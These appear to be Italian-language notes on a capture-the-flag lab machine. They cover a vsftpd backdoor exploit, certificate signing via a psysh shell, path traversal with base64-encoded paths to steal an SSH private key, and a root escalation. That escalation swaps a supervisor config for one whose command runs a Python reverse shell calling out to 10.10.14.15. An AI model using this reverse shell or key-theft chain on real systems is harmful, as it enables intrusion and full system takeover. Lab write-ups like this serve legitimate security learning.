Cosa fare:

1) trovato exploit con backdoor vsftpd-2.3.4-exploit
2) sulla psyshell, vedersi show $tokyo
3) quindi eseguire la funzione sudo $tokyo->sign(Certificatoca che si ottiene tramite openssl client richiesta al server,certificato utente generato da chiave privata)
4) restituisce un certificato da convertire a file p12 : openssl pkcs12 -export -in cert.csr -inkey private-key-file-name.key -out filename.p12
5) firefox: sulle impostazioni > certificaticertificati serverc'è export
6) attraverso ?path=../ ecc mi scarico la chiave privata id_rsa
7) infatti /file/ (scritta in base 64, quindi metto la scritta base64 del path che voglio scaricare)
8) uso la chiave privata accesso a ssh professor
9) ssh -i id_rsa professor@10.10.10.131

Root:
Per il root mi accorgo che viene eseguito un programma continuamente: memcached.ini, non posso modificarlo, ma posso modificarne il nome, modifico il nome, ne creo un altro uguale memcached.ini con dentro:
[program:memcached]
command = sudo python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.15",7080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

aspetto e divento root.